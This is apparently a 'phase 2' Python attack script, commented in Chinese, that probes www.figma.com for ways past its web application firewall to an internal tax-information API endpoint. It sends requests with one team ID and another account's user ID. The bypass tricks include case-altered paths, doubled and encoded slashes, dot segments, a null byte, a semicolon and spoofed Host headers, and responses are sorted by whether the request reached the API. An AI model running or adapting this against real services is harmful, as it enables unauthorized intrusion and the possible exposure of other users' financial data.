# -*- coding: utf-8 -*-
"""第二阶段: 精确路径变形 - 找"绕WAF + 保住API路由"的组合
阶段1结论: WAF大小写敏感(改大小写绕过WAF但丢API源站路由->营销站404)
           双斜杠全段绕过WAF但被代理 reject(server-timing: rejected)
目标: 单字母大小写 / 单段双斜杠 是否出现: API源JSON响应(404/400/401)或200
判读: 403=WAF拦截 | Next.js营销站=丢路由 | proxy rejected=到代理层 | JSON=到达API应用
"""
import io, sys, time, urllib.error, urllib.request
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

A_TEAM = "1666382706663462213"
B_UID = "1667396392129259941"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
OUT = io.open("_resolver_403_head_probe2_out.txt", "w", encoding="utf-8")

def call(label, url):
    hdrs = {"User-Agent": UA, "Accept": "*/*",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/"}
    req = urllib.request.Request(url, headers=hdrs, method="GET")
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=20)
        body = r.read().decode(errors="replace")
        status = r.status
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        status = e.code
        r = e
    except Exception as e:
        print(f"[{label}] !! {type(e).__name__}: {str(e)[:100]}")
        return
    ms = int((time.time() - t0) * 1000)
    kind = "WAF403" if status == 403 else ("MKT404" if "netlify" in str(r.headers).lower() or "x-nf-request" in str(r.headers).lower() else ("PROXY404" if "server-timing" in str(r.headers).lower() else "OTHER"))
    line = f"[{label}] {status} ({ms}ms) {kind} ct={r.headers.get('Content-Type','')} body={body[:120]!r}"
    OUT.write(line + "\n")
    print(line)

BASE = "https://www.figma.com"
QS = "team_id=%s&userId=%s" % (A_TEAM, B_UID)

print("========== A. 单字母大小写(逐段首字母大写) ==========")
cases = [
    ("cap-API",       "/API/internal/livegraph/sinatra_resolver/tax_info"),
    ("cap-api2",      "/api/Internal/livegraph/sinatra_resolver/tax_info"),
    ("cap-livegraph", "/api/internal/Livegraph/sinatra_resolver/tax_info"),
    ("cap-LiveGraph", "/api/internal/LiveGraph/sinatra_resolver/tax_info"),
    ("cap-sinatra",   "/api/internal/livegraph/Sinatra_resolver/tax_info"),
    ("cap-Sinatra",   "/api/internal/livegraph/SinatraResolver/tax_info"),
    ("cap-tax",       "/api/internal/livegraph/sinatra_resolver/Tax_info"),
    ("mixed-2",       "/api/Internal/Livegraph/sinatra_resolver/tax_info"),
    ("mixed-3",       "/api/internal/Livegraph/Sinatra_resolver/tax_info"),
]
for name, p in cases:
    call(name, f"{BASE}{p}?{QS}")
    time.sleep(1)

print("\n========== B. 单段双斜杠 ==========")
cases2 = [
    ("ds-api",       "/api//internal/livegraph/sinatra_resolver/tax_info"),
    ("ds-internal",  "/api/internal//livegraph/sinatra_resolver/tax_info"),
    ("ds-livegraph", "/api/internal/livegraph//sinatra_resolver/tax_info"),
    ("ds-resolver",  "/api/internal/livegraph/sinatra_resolver//tax_info"),
    ("ds-2seg",      "/api//internal//livegraph/sinatra_resolver/tax_info"),
]
for name, p in cases2:
    call(name, f"{BASE}{p}?{QS}")
    time.sleep(1)

print("\n========== C. 编码组合 ==========")
cases3 = [
    ("enc-slash-1",  "/api%2Finternal/livegraph/sinatra_resolver/tax_info"),
    ("enc-slash-2",  "/api/internal%2Flivegraph/sinatra_resolver/tax_info"),
    ("enc-dot",      "/api/internal/./livegraph/./sinatra_resolver/./tax_info"),
    ("enc-uni",      "/api/internal/livegraph/sinatra_resolver/tax_info"),
    ("null-bytes",   "/api/internal/livegraph/sinatra_resolver/tax_info%00"),
    ("semi-all",     "/api;/internal/livegraph/sinatra_resolver/tax_info"),
]
for name, p in cases3:
    call(name, f"{BASE}{p}?{QS}")
    time.sleep(1)

print("\n========== D. Host/协议变体 ==========")
# Host: internal-proxy.prod.figma.com (直连尝试)
for hname, host in [("host-internal", "internal-proxy.prod.figma.com"),
                    ("host-api", "api.figma.com")]:
    url = f"https://www.figma.com/api/internal/livegraph/sinatra_resolver/tax_info?{QS}"
    hdrs = {"User-Agent": UA, "Accept": "*/*", "Host": host,
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/"}
    req = urllib.request.Request(url, headers=hdrs, method="GET")
    try:
        r = urllib.request.urlopen(req, timeout=20)
        body = r.read().decode(errors="replace")
        status = r.status
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        status = e.code
        r = e
    except Exception as e:
        print(f"[{hname}] !! {type(e).__name__}: {str(e)[:100]}")
        continue
    line = f"[{hname}] {status} ct={r.headers.get('Content-Type','')} body={body[:150]!r}"
    OUT.write(line + "\n")
    print(line)
    time.sleep(1)

OUT.close()
print("\n落盘: _resolver_403_head_probe2_out.txt")
